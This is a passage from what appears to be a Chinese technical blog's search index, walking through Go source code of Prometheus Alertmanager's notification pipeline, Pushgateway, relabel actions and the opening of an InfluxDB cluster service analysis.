Stages.\nfunc BuildPipeline(\n\tconfs []*config.Receiver,\n\ttmpl *template.Template,\n\twait func() time.Duration,\n\tinhibitor *inhibit.Inhibitor,\n\tsilences *silence.Silences,\n\tnotificationLog nflog.Log,\n\tmarker types.Marker,\n) RoutingStage {\n\trs := RoutingStage{}\n\n\tis := NewInhibitStage(inhibitor, marker)\n\tss := NewSilenceStage(silences, marker)\n\n\tfor _, rc := range confs {\n\t\trs[rc.Name] = MultiStage{is, ss, createStage(rc, tmpl, wait, notificationLog)}\n\t}\n\treturn rs\n}\n```\n\ncreateStage方法：\n\n```go\n// createStage creates a pipeline of stages for a receiver.\nfunc createStage(rc *config.Receiver, tmpl *template.Template, wait func() time.Duration, notificationLog nflog.Log) Stage {\n\tvar fs FanoutStage\n\tfor _, i := range BuildReceiverIntegrations(rc, tmpl) {\n\t\trecv := &nflogpb.Receiver{\n\t\t\tGroupName:   rc.Name,\n\t\t\tIntegration: i.name,\n\t\t\tIdx:         uint32(i.idx),\n\t\t}\n\t\tvar s MultiStage\n\t\ts = append(s, NewWaitStage(wait))\n\t\ts = append(s, NewDedupStage(notificationLog, recv, i.conf.SendResolved()))\n\t\ts = append(s, NewRetryStage(i))\n\t\ts = append(s, NewSetNotifiesStage(notificationLog, recv))\n\n\t\tfs = append(fs, s)\n\t}\n\treturn fs\n}\n```\n\nBuildReceiverIntegrations方法主要用于构建告警接收器对应的Notifier，兵器再alertmanager.yml配置文件中的每种告警接收器，可以定义多种Notifier。\n\n```go\n// BuildReceiverIntegrations builds a list of integration notifiers off of a\n// receivers config.\nfunc BuildReceiverIntegrations(nc *config.Receiver, tmpl *template.Template) []Integration {\n\tvar (\n\t\tintegrations []Integration\n\t\tadd          = func(name string, i int, n Notifier, nc notifierConfig) {\n\t\t\tintegrations = append(integrations, Integration{\n\t\t\t\tnotifier: n,\n\t\t\t\tconf:     nc,\n\t\t\t\tname:     name,\n\t\t\t\tidx:      i,\n\t\t\t})\n\t\t}\n\t)\n\n\tfor i, c := range nc.WebhookConfigs {\n\t\tn := NewWebhook(c, tmpl)\n\t\tadd(\"webhook\", i, n, c)\n\t}\n\tfor i, c := range nc.EmailConfigs {\n\t\tn := NewEmail(c, tmpl)\n\t\tadd(\"email\", i, n, c)\n\t}\n\tfor i, c := range nc.PagerdutyConfigs {\n\t\tn := NewPagerDuty(c, tmpl)\n\t\tadd(\"pagerduty\", i, n, c)\n\t}\n\tfor i, c := range nc.OpsGenieConfigs {\n\t\tn := NewOpsGenie(c, tmpl)\n\t\tadd(\"opsgenie\", i, n, c)\n\t}\n\tfor i, c := range nc.SlackConfigs {\n\t\tn := NewSlack(c, tmpl)\n\t\tadd(\"slack\", i, n, c)\n\t}\n\tfor i, c := range nc.HipchatConfigs {\n\t\tn := NewHipchat(c, tmpl)\n\t\tadd(\"hipchat\", i, n, c)\n\t}\n\tfor i, c := range nc.VictorOpsConfigs {\n\t\tn := NewVictorOps(c, tmpl)\n\t\tadd(\"victorops\", i, n, c)\n\t}\n\tfor i, c := range nc.PushoverConfigs {\n\t\tn := NewPushover(c, tmpl)\n\t\tadd(\"pushover\", i, n, c)\n\t}\n\treturn integrations\n}\n\n```\n\n以webhook类型Notifier为列，数据格式化之后，以post方式发送告警信息。\n\n```go\n// Notify implements the Notifier interface.\nfunc (w *Webhook) Notify(ctx context.Context, alerts ...*types.Alert) (bool, error) {\n\tdata := w.tmpl.Data(receiverName(ctx), groupLabels(ctx), alerts...)\n\n\tgroupKey, ok := GroupKey(ctx)\n\tif !ok {\n\t\tlog.Errorf(\"group key missing\")\n\t}\n\n\tmsg := &WebhookMessage{\n\t\tVersion:  \"4\",\n\t\tData:     data,\n\t\tGroupKey: groupKey,\n\t}\n\n\tvar buf bytes.Buffer\n\tif err := json.NewEncoder(&buf).Encode(msg); err != nil {\n\t\treturn false, err\n\t}\n\n\treq, err := http.NewRequest(\"POST\", w.URL, &buf)\n\tif err != nil {\n\t\treturn true, err\n\t}\n\treq.Header.Set(\"Content-Type\", contentTypeJSON)\n\treq.Header.Set(\"User-Agent\", userAgentHeader)\n\n\tresp, err := ctxhttp.Do(ctx, http.DefaultClient, req)\n\tif err != nil {\n\t\treturn true, err\n\t}\n\tresp.Body.Close()\n\n\treturn w.retry(resp.StatusCode)\n}\n```\n\n调用链的执行流程：\n\n![1572419260049](/images/1572419260049.png)\n\nRoutingStage阶段的Exec方法：\n\n```go\n// Exec implements the Stage interface.\nfunc (rs RoutingStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\treceiver, ok := ReceiverName(ctx)\n\tif !ok {\n\t\treturn ctx, nil, fmt.Errorf(\"receiver missing\")\n\t}\n\n\ts, ok := rs[receiver]\n\tif !ok {\n\t\treturn ctx, nil, fmt.Errorf(\"stage for receiver missing\")\n\t}\n\n\treturn s.Exec(ctx, alerts...)\n}\n```\n\n```go\n// Exec attempts to execute all stages concurrently and discards the results.\n// It returns its input alerts and a types.MultiError if one or more stages fail.\nfunc (fs FanoutStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar (\n\t\twg sync.WaitGroup\n\t\tme types.MultiError\n\t)\n\twg.Add(len(fs))\n\n\tfor _, s := range fs {\n\t\tgo func(s Stage) {\n\t\t\tif _, _, err := s.Exec(ctx, alerts...); err != nil {\n\t\t\t\tme.Add(err)\n\t\t\t\tlog.Errorf(\"Error on notify: %s\", err)\n\t\t\t}\n\t\t\twg.Done()\n\t\t}(s)\n\t}\n\twg.Wait()\n\n\tif me.Len() > 0 {\n\t\treturn ctx, alerts, &me\n\t}\n\treturn ctx, alerts, nil\n}\n```\n\n```go\n// Exec implements the Stage interface.\nfunc (ms MultiStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar err error\n\tfor _, s := range ms {\n\t\tif len(alerts) == 0 {\n\t\t\treturn ctx, nil, nil\n\t\t}\n\n\t\tctx, alerts, err = s.Exec(ctx, alerts...)\n\t\tif err != nil {\n\t\t\treturn ctx, nil, err\n\t\t}\n\t}\n\treturn ctx, alerts, nil\n}\n```\n\n告警抑制的配置，inhibit_rules配置项目：\n\n```go\n// Exec implements the Stage interface.\nfunc (n *InhibitStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar filtered []*types.Alert\n\tfor _, a := range alerts {\n\t\t_, ok := n.marker.Inhibited(a.Fingerprint())\n\t\t// TODO(fabxc): increment total alerts counter.\n\t\t// Do not send the alert if the silencer mutes it.\n\t\tif !n.muter.Mutes(a.Labels) {\n\t\t\t// TODO(fabxc): increment muted alerts counter.\n\t\t\tfiltered = append(filtered, a)\n\t\t\t// Store whether a previously inhibited alert is firing again.\n\t\t\ta.WasInhibited = ok\n\t\t}\n\t}\n\n\treturn ctx, filtered, nil\n}\n```\n\n告警静音：\n\n```go\n// Exec implements the Stage interface.\nfunc (n *SilenceStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar filtered []*types.Alert\n\tfor _, a := range alerts {\n\t\t_, ok := n.marker.Silenced(a.Fingerprint())\n\t\t// TODO(fabxc): increment total alerts counter.\n\t\t// Do not send the alert if the silencer mutes it.\n\t\tsils, err := n.silences.Query(\n\t\t\tsilence.QState(silence.StateActive),\n\t\t\tsilence.QMatches(a.Labels),\n\t\t)\n\t\tif err != nil {\n\t\t\tlog.Errorf(\"Querying silences failed: %s\", err)\n\t\t}\n\n\t\tif len(sils) == 0 {\n\t\t\t// TODO(fabxc): increment muted alerts counter.\n\t\t\tfiltered = append(filtered, a)\n\t\t\tn.marker.SetSilenced(a.Labels.Fingerprint())\n\t\t\t// Store whether a previously silenced alert is firing again.\n\t\t\ta.WasSilenced = ok\n\t\t} else {\n\t\t\tids := make([]string, len(sils))\n\t\t\tfor i, s := range sils {\n\t\t\t\tids[i] = s.Id\n\t\t\t}\n\t\t\tn.marker.SetSilenced(a.Labels.Fingerprint(), ids...)\n\t\t}\n\t}\n\n\treturn ctx, filtered, nil\n}\n```\n\n\n\n## Pushgateway\n\npushgateway主要作用是允许临时任务和批作业向prometheus公开指标数据。主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这次 jobs 可以直接向 Prometheus server 端推送它们的 metrics。这种方式主要用于服务层面的 metrics，对于机器层面的 metrices，需要使用 node exporter。\n\npush gateway的代码逻辑都再main函数里面：\n\n```go\nfunc main() {\n\tvar (\n\t\tapp = kingpin.New(filepath.Base(os.Args[0]), \"The Pushgateway\")\n\n\t\tlistenAddress       = app.Flag(\"web.listen-address\", \"Address to listen on for the web interface, API, and telemetry.\").Default(\":9091\").String()\n\t\tmetricsPath         = app.Flag(\"web.telemetry-path\", \"Path under which to expose metrics.\").Default(\"/metrics\").String()\n\t\texternalURL         = app.Flag(\"web.external-url\", \"The URL under which the Pushgateway is externally reachable.\").Default(\"\").URL()\n\t\troutePrefix         = app.Flag(\"web.route-prefix\", \"Prefix for the internal routes of web endpoints. Defaults to the path of --web.external-url.\").Default(\"\").String()\n\t\tenableLifeCycle     = app.Flag(\"web.enable-lifecycle\", \"Enable shutdown via HTTP request.\").Default(\"false\").Bool()\n\t\tenableAdminAPI      = app.Flag(\"web.enable-admin-api\", \"Enable API endpoints for admin control actions.\").Default(\"false\").Bool()\n\t\tpersistenceFile     = app.Flag(\"persistence.file\", \"File to persist metrics. If empty, metrics are only kept in memory.\").Default(\"\").String()\n\t\tpersistenceInterval = app.Flag(\"persistence.interval\", \"The minimum interval at which to write out the persistence file.\").Default(\"5m\").Duration()\n\t\tpromlogConfig       = promlog.Config{}\n\t)\n\tpromlogflag.AddFlags(app, &promlogConfig)\n\tapp.Version(version.Print(\"pushgateway\"))\n\tapp.HelpFlag.Short('h')\n\tkingpin.MustParse(app.Parse(os.Args[1:]))\n\tlogger := promlog.New(&promlogConfig)\n\n\t*routePrefix = computeRoutePrefix(*routePrefix, *externalURL)\n\texternalPathPrefix := computeRoutePrefix(\"\", *externalURL)\n\n\tlevel.Info(logger).Log(\"msg\", \"starting pushgateway\", \"version\", version.Info())\n\tlevel.Info(logger).Log(\"build_context\", version.BuildContext())\n\tlevel.Debug(logger).Log(\"msg\", \"external URL\", \"url\", *externalURL)\n\tlevel.Debug(logger).Log(\"msg\", \"path prefix used externally\", \"path\", externalPathPrefix)\n\tlevel.Debug(logger).Log(\"msg\", \"path prefix for internal routing\", \"path\", *routePrefix)\n\n\t// flags is used to show command line flags on the status page.\n\t// Kingpin default flags are excluded as they would be confusing.\n\tflags := map[string]string{}\n\tboilerplateFlags := kingpin.New(\"\", \"\").Version(\"\")\n\tfor _, f := range app.Model().Flags {\n\t\tif boilerplateFlags.GetFlag(f.Name) == nil {\n\t\t\tflags[f.Name] = f.Value.String()\n\t\t}\n\t}\n\n\tms := storage.NewDiskMetricStore(*persistenceFile, *persistenceInterval, prometheus.DefaultGatherer, logger)\n\n\t// Create a Gatherer combining the DefaultGatherer and the metrics from the metric store.\n\tg := prometheus.Gatherers{\n\t\tprometheus.DefaultGatherer,\n\t\tprometheus.GathererFunc(func() ([]*dto.MetricFamily, error) { return ms.GetMetricFamilies(), nil }),\n\t}\n\n\tr := httprouter.New()\n\tr.Handler(\"GET\", *routePrefix+\"/-/healthy\", handler.Healthy(ms))\n\tr.Handler(\"GET\", *routePrefix+\"/-/ready\", handler.Ready(ms))\n\tr.Handler(\n\t\t\"GET\", path.Join(*routePrefix, *metricsPath),\n\t\tpromhttp.HandlerFor(g, promhttp.HandlerOpts{\n\t\t\tErrorLog: logFunc(level.Error(logger).Log),\n\t\t}),\n\t)\n\n\tif *enableAdminAPI {\n\t\t// To be consistent with Prometheus codebase and provide endpoint versioning, we use the same path\n\t\t// as Prometheus for its admin endpoints, even if this may feel excesive for just one simple endpoint\n\t\t// this will likely change over time.\n\t\tr.Handler(\"PUT\", *routePrefix+\"/api/v1/admin/wipe\", handler.WipeMetricStore(ms, logger))\n\t}\n\n\t// Handlers for pushing and deleting metrics.\n\tpushAPIPath := *routePrefix + \"/metrics\"\n\tfor _, suffix := range []string{\"\", handler.Base64Suffix} {\n\t\tjobBase64Encoded := suffix == handler.Base64Suffix\n\t\tr.PUT(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, true, jobBase64Encoded, logger))\n\t\tr.POST(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, false, jobBase64Encoded, logger))\n\t\tr.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Delete(ms, jobBase64Encoded, logger))\n\t\tr.PUT(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, true, jobBase64Encoded, logger))\n\t\tr.POST(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, false, jobBase64Encoded, logger))\n\t\tr.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Delete(ms, jobBase64Encoded, logger))\n\t}\n\tr.Handler(\"GET\", *routePrefix+\"/static/*filepath\", handler.Static(asset.Assets, *routePrefix))\n\n\tstatusHandler := handler.Status(ms, asset.Assets, flags, externalPathPrefix, logger)\n\tr.Handler(\"GET\", *routePrefix+\"/status\", statusHandler)\n\tr.Handler(\"GET\", *routePrefix+\"/\", statusHandler)\n\n\t// Re-enable pprof.\n\tr.GET(*routePrefix+\"/debug/pprof/*pprof\", handlePprof)\n\n\tlevel.Info(logger).Log(\"listen_address\", *listenAddress)\n\tl, err := net.Listen(\"tcp\", *listenAddress)\n\tif err != nil {\n\t\tlevel.Error(logger).Log(\"err\", err)\n\t\tos.Exit(1)\n\t}\n\n\tquitCh := make(chan struct{})\n\tquitHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Requesting termination... Goodbye!\")\n\t\tclose(quitCh)\n\t})\n\n\tforbiddenAPINotEnabled := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusForbidden)\n\t\tw.Write([]byte(\"Lifecycle API is not enabled.\"))\n\t})\n\n\tif *enableLifeCycle {\n\t\tr.Handler(\"PUT\", *routePrefix+\"/-/quit\", quitHandler)\n\t\tr.Handler(\"POST\", *routePrefix+\"/-/quit\", quitHandler)\n\t} else {\n\t\tr.Handler(\"PUT\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled)\n\t\tr.Handler(\"POST\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled)\n\t}\n\n\tr.Handler(\"GET\", \"/-/quit\", http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST or PUT requests allowed.\"))\n\t}))\n\n\tgo closeListenerOnQuit(l, quitCh, logger)\n\terr = (&http.Server{Addr: *listenAddress, Handler: r}).Serve(l)\n\tlevel.Error(logger).Log(\"msg\", \"HTTP server stopped\", \"err\", err)\n\t// To give running connections a chance to submit their payload, we wait\n\t// for 1sec, but we don't want to wait long (e.g. until all connections\n\t// are done) to not delay the shutdown.\n\ttime.Sleep(time.Second)\n\tif err := ms.Shutdown(); err != nil {\n\t\tlevel.Error(logger).Log(\"msg\", \"problem shutting down metric storage\", \"err\", err)\n\t}\n}\n```\n\n通过push到接口metric传递数据到prometheus，push接口调用push函数去使用。\n\n```go\n// Push returns an http.Handler which accepts samples over HTTP and stores them\n// in the MetricStore. If replace is true, all metrics for the job and instance\n// given by the request are deleted before new ones are stored.\n//\n// The returned handler is already instrumented for Prometheus.\nfunc Push(\n\tms storage.MetricStore, replace bool, jobBase64Encoded bool, logger log.Logger,\n) func(http.ResponseWriter, *http.Request, httprouter.Params) {\n\tvar ps httprouter.Params\n\tvar mtx sync.Mutex // Protects ps.\n\n\thandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tjob := ps.ByName(\"job\")\n\t\tif jobBase64Encoded {\n\t\t\tvar err error\n\t\t\tif job, err = decodeBase64(job); err != nil {\n\t\t\t\thttp.Error(w, fmt.Sprintf(\"invalid base64 encoding in job name %q: %v\", ps.ByName(\"job\"), err), http.StatusBadRequest)\n\t\t\t\tlevel.Debug(logger).Log(\"msg\", \"invalid base64 encoding in job name\", \"job\", ps.ByName(\"job\"), \"err\", err.Error())\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tlabelsString := ps.ByName(\"labels\")\n\t\tmtx.Unlock()\n\n\t\tlabels, err := splitLabels(labelsString)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"failed to parse URL\", \"url\", labelsString, \"err\", err.Error())\n\t\t\treturn\n\t\t}\n\t\tif job == \"\" {\n\t\t\thttp.Error(w, \"job name is required\", http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"job name is required\")\n\t\t\treturn\n\t\t}\n\t\tlabels[\"job\"] = job\n\n\t\tvar metricFamilies map[string]*dto.MetricFamily\n\t\tctMediatype, ctParams, ctErr := mime.ParseMediaType(r.Header.Get(\"Content-Type\"))\n\t\tif ctErr == nil && ctMediatype == \"application/vnd.google.protobuf\" &&\n\t\t\tctParams[\"encoding\"] == \"delimited\" &&\n\t\t\tctParams[\"proto\"] == \"io.prometheus.client.MetricFamily\" {\n\t\t\tmetricFamilies = map[string]*dto.MetricFamily{}\n\t\t\tfor {\n\t\t\t\tmf := &dto.MetricFamily{}\n\t\t\t\tif _, err = pbutil.ReadDelimited(r.Body, mf); err != nil {\n\t\t\t\t\tif err == io.EOF {\n\t\t\t\t\t\terr = nil\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tmetricFamilies[mf.GetName()] = mf\n\t\t\t}\n\t\t} else {\n\t\t\t// We could do further content-type checks here, but the\n\t\t\t// fallback for now will anyway be the text format\n\t\t\t// version 0.0.4, so just go for it and see if it works.\n\t\t\tvar parser expfmt.TextParser\n\t\t\tmetricFamilies, err = parser.TextToMetricFamilies(r.Body)\n\t\t}\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"failed to parse text\", \"err\", err.Error())\n\t\t\treturn\n\t\t}\n\t\tnow := time.Now()\n\t\terrCh := make(chan error, 1)\n\t\terrReceived := false\n\t\tms.SubmitWriteRequest(storage.WriteRequest{\n\t\t\tLabels:         labels,\n\t\t\tTimestamp:      now,\n\t\t\tMetricFamilies: metricFamilies,\n\t\t\tReplace:        replace,\n\t\t\tDone:           errCh,\n\t\t})\n\t\tfor err := range errCh {\n\t\t\t// Send only first error via HTTP, but log all of them.\n\t\t\t// TODO(beorn): Consider sending all errors once we\n\t\t\t// have a use case. (Currently, at most one error is\n\t\t\t// produced.)\n\t\t\tif !errReceived {\n\t\t\t\thttp.Error(\n\t\t\t\t\tw,\n\t\t\t\t\tfmt.Sprintf(\"pushed metrics are invalid or inconsistent with existing metrics: %v\", err),\n\t\t\t\t\thttp.StatusBadRequest,\n\t\t\t\t)\n\t\t\t}\n\t\t\tlevel.Error(logger).Log(\n\t\t\t\t\"msg\", \"pushed metrics are invalid or inconsistent with existing metrics\",\n\t\t\t\t\"method\", r.Method,\n\t\t\t\t\"source\", r.RemoteAddr,\n\t\t\t\t\"err\", err.Error(),\n\t\t\t)\n\t\t\terrReceived = true\n\t\t}\n\t})\n\n\tinstrumentedHandler := promhttp.InstrumentHandlerRequestSize(\n\t\thttpPushSize, promhttp.InstrumentHandlerDuration(\n\t\t\thttpPushDuration, promhttp.InstrumentHandlerCounter(\n\t\t\t\thttpCnt.MustCurryWith(prometheus.Labels{\"handler\": \"push\"}),\n\t\t\t\thandler,\n\t\t\t)))\n\n\treturn func(w http.ResponseWriter, r *http.Request, params httprouter.Params) {\n\t\tmtx.Lock()\n\t\tps = params\n\t\tinstrumentedHandler.ServeHTTP(w, r)\n\t}\n}\n```\n\n数据push完会放入pushgateway的缓存队列中存储，prometheus通过配置，采用pull的方式拉取数据获取指标。\n\n## relabel\n\nrelabel功能主要是用于实现多数据中心的监控数据聚合。Relabel可以在Prometheus采集数据之前，通过Target实例的Metadata信息，动态重新写入Label的值。relabel可以对Target实例进行过滤和选择。\n\nrelabel实现过程：\n\n```go\n// Process returns a relabeled copy of the given label set. The relabel configurations\n// are applied in order of input.\n// If a label set is dropped, nil is returned.\n// May return the input labelSet modified.\nfunc Process(labels model.LabelSet, cfgs ...*config.RelabelConfig) model.LabelSet {\n\tfor _, cfg := range cfgs {\n\t\tlabels = relabel(labels, cfg)\n\t\tif labels == nil {\n\t\t\treturn nil\n\t\t}\n\t}\n\treturn labels\n}\n```\n\n调用process函数来处理，针对每个配置进行relabel操作。\n\nrelabel函数实现，relabel的类型有：RelabelDrop， RelabelKeep，RelabelReplace，RelabelLabelMap，RelabelLabelDrop，RelabelLabelKeep，RelabelHashMod\n\n```go\nfunc relabel(labels model.LabelSet, cfg *config.RelabelConfig) model.LabelSet {\n\tvalues := make([]string, 0, len(cfg.SourceLabels))\n\tfor _, ln := range cfg.SourceLabels {\n\t\tvalues = append(values, string(labels[ln]))\n\t}\n\tval := strings.Join(values, cfg.Separator)\n\n\tswitch cfg.Action {\n\tcase config.RelabelDrop:\n\t\tif cfg.Regex.MatchString(val) {\n\t\t\treturn nil\n\t\t}\n\tcase config.RelabelKeep:\n\t\tif !cfg.Regex.MatchString(val) {\n\t\t\treturn nil\n\t\t}\n\tcase config.RelabelReplace:\n\t\tindexes := cfg.Regex.FindStringSubmatchIndex(val)\n\t\t// If there is no match no replacement must take place.\n\t\tif indexes == nil {\n\t\t\tbreak\n\t\t}\n\t\ttarget := model.LabelName(cfg.Regex.ExpandString([]byte{}, cfg.TargetLabel, val, indexes))\n\t\tif !target.IsValid() {\n\t\t\tdelete(labels, model.LabelName(cfg.TargetLabel))\n\t\t\tbreak\n\t\t}\n\t\tres := cfg.Regex.ExpandString([]byte{}, cfg.Replacement, val, indexes)\n\t\tif len(res) == 0 {\n\t\t\tdelete(labels, model.LabelName(cfg.TargetLabel))\n\t\t\tbreak\n\t\t}\n\t\tlabels[target] = model.LabelValue(res)\n\tcase config.RelabelHashMod:\n\t\tmod := sum64(md5.Sum([]byte(val))) % cfg.Modulus\n\t\tlabels[model.LabelName(cfg.TargetLabel)] = model.LabelValue(fmt.Sprintf(\"%d\", mod))\n\tcase config.RelabelLabelMap:\n\t\tout := make(model.LabelSet, len(labels))\n\t\t// Take a copy to avoid infinite loops.\n\t\tfor ln, lv := range labels {\n\t\t\tout[ln] = lv\n\t\t}\n\t\tfor ln, lv := range labels {\n\t\t\tif cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tres := cfg.Regex.ReplaceAllString(string(ln), cfg.Replacement)\n\t\t\t\tout[model.LabelName(res)] = lv\n\t\t\t}\n\t\t}\n\t\tlabels = out\n\tcase config.RelabelLabelDrop:\n\t\tfor ln := range labels {\n\t\t\tif cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tdelete(labels, ln)\n\t\t\t}\n\t\t}\n\tcase config.RelabelLabelKeep:\n\t\tfor ln := range labels {\n\t\t\tif !cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tdelete(labels, ln)\n\t\t\t}\n\t\t}\n\tdefault:\n\t\tpanic(fmt.Errorf(\"retrieval.relabel: unknown relabel action type %q\", cfg.Action))\n\t}\n\treturn labels\n}\n```\n\naction=keep, 丢弃指定源标签的标签值没有匹配到regex的target\n\naction=drop，丢弃指定源标签的标签值匹配到regex的target\n\naction=labeldrop，丢弃匹配到regex 的标签\n\naction=labelkeep，丢弃没有匹配到regex 的标签\n\naction=replace，更改标签名、更改标签值、合并标签\n\naction=hashmod，将多个源标签的值进行hash，作为target标签的值\n\naction=labelmap，Regex匹配名->replacement用原标签名的部分来替换名\n\n**replace是缺省action，可以不配置action**\n\n\n\n## 参考资料\n\nhttps://www.jianshu.com/p/c21d399c140a\n\nhttps://blog.csdn.net/luanpeng825485697/article/details/82318204\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["prometheus"]},{"title":"influxdb集群代码分析","url":"/2020/02/17/influxdb 集群代码分析/","content":"\n## influxdb集群代码分析\n\n本文主要分析下influxdb中cluster部分的代码：\n\n入口函数：\n\n```go\nfunc (s *Server) OpenDataServer() error {\n\tif s.TSDBStore != nil && !s.DataServicesOpened {\n\t\ts.DataServicesOpened = true\n\t\t// Append services.\n\t\ts.appendClusterService(s.config.Cluster)   // 增加集群服务注册\n\t\ts.appendMonitorService()\n\t\ts.appendPrecreatorService(s.config.Precreator)\n\t\ts.appendSnapshotterService()\n\t\ts.appendContinuousQueryService(s.config.ContinuousQuery)\n\t\ts.appendAntiEntropyService(s.config.AntiEntropy)\n\t\ts.appendHTTPDService(s.config.HTTPD)\n\t\ts.appendStorageService(s.config.Storage)\n\t\ts.appendRetentionPolicyService(s.config.Retention)\n\t\tfor _, i := range s.config.GraphiteInputs {\n\t\t\tif err := s.appendGraphiteService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.CollectdInputs {\n\t\t\ts.appendCollectdService(i)\n\t\t}\n\t\tfor _, i := range s.config.OpenTSDBInputs {\n\t\t\tif err := s.appendOpenTSDBService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.UDPInputs {\n\t\t\ts.appendUDPService(i)\n\t\t}\n\n\t\ts.Subscriber.MetaClient = s.MetaClient\n\t\ts.PointsWriter.MetaClient = s.MetaClient\n\t\ts.Monitor.MetaClient = s.MetaClient\n\t\ts.ShardWriter.MetaClient = s.MetaClient\n\t\ts.HintedHandoff.MetaClient = s.MetaClient\n\n\t\ts.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)\n\t\ts.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaClient.WithLogger(s.Logger)\n\t\t}\n\t\ts.TSDBStore.WithLogger(s.Logger)\n\t\tif s.config.Data.QueryLogEnabled {\n\t\t\ts.QueryExecutor.WithLogger(s.Logger)\n\t\t}\n\t\ts.PointsWriter.WithLogger(s.Logger)\n\t\ts.Subscriber.WithLogger(s.Logger)\n\t\ts.HintedHandoff.WithLogger(s.Logger)\n\t\tfor _, svc := range s.Services {\n\t\t\tsvc.WithLogger(s.Logger)\n\t\t}\n\t\ts.SnapshotterService.WithLogger(s.Logger)\n\t\ts.Monitor.WithLogger(s.Logger)\n\n\t\t// Open TSDB store.\n\t\tif err := s.TSDBStore.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open tsdb store: %s\", err)\n\t\t}\n\n\t\t// Open the hinted handoff service\n\t\tif err := s.HintedHandoff.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open hinted handoff: %s\", err)\n\t\t}\n\n\t\t// Open the subscriber service\n\t\tif err := s.Subscriber.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open subscriber: %s\", err)\n\t\t}\n\n\t\t// Open the points writer service\n\t\tif err := s.PointsWriter.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open points writer: %s\", err)\n\t\t}\n\n\t\ts.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())\n\n\t\tfor _, service := range s.Services {\n\t\t\tif err := service.Open(); err != nil {             //集群服务启动\n\t\t\t\treturn fmt.Errorf(\"open service: %s\", err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\n\t}\n\tif s.TSDBStore == nil {\n\t\treturn fmt.Errorf(\"Data server is not enabled\")\n\t}\n\treturn nil\n}\n```\n\n启动集群服务代码：\n\n```go\n// Open opens the network listener and begins serving requests.\nfunc (s *Service) Open() error {\n\n\ts.Logger.Info(\"Starting cluster service\")\n\t// Begin serving conections.\n\ts.wg.Add(1)\n\tgo s.serve()   //启动服务\n\n\ts.CopyShardTaskManager.Logger = s.Logger\n\tgo s.CopyShardTaskManager.WaitForTask()               //等待task任务\n\n\treturn nil\n}\n```\n\nserve函数：\n\n```go\n// serve accepts connections from the listener and handles them.\nfunc (s *Service) serve() {\n\tdefer s.wg.Done()\n\n\tfor {\n\t\t// Check if the service is shutting down.\n\t\tselect {\n\t\tcase <-s.closing:\n\t\t\treturn\n\t\tdefault:\n\t\t}\n\n\t\t// Accept the next connection.\n\t\tconn, err := s.Listener.Accept()            //监听连接请求\n\t\tif err != nil {\n\t\t\tif strings.Contains(err.Error(), \"connection closed\") {\n\t\t\t\ts.Logger.Info(\"cluster service accept error\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.Logger.Info(\"accept error\", zap.Error(err))\n\t\t\tcontinue\n\t\t}\n\n\t\t// Delegate connection handling to a separate goroutine.\n\t\ts.wg.Add(1)\n\t\tgo func() {\n\t\t\tdefer s.wg.Done()\n\t\t\ts.handleConn(conn)             //主要处理函数\n\t\t}()\n\t}\n}\n```\n\nhandleConn函数启动：\n\n```go\n// handleConn services an individual TCP connection.\nfunc (s *Service) handleConn(conn net.Conn) {\n\t// Ensure connection is closed when service is closed.\n\tclosing := make(chan struct{})\n\tdefer close(closing)\n\tgo func() {\n\t\tselect {\n\t\tcase <-closing:\n\t\tcase <-s.closing:\n\t\t}\n\t\tconn.Close()\n\t}()\n\n\ts.Logger.Info(\"accept remote connection\", zap.String(\"remoteaddr\", conn.RemoteAddr().String()))\n\tdefer func() {\n\t\ts.Logger.Info(\"close remote connection\", zap.String(\"remoteaddr\", 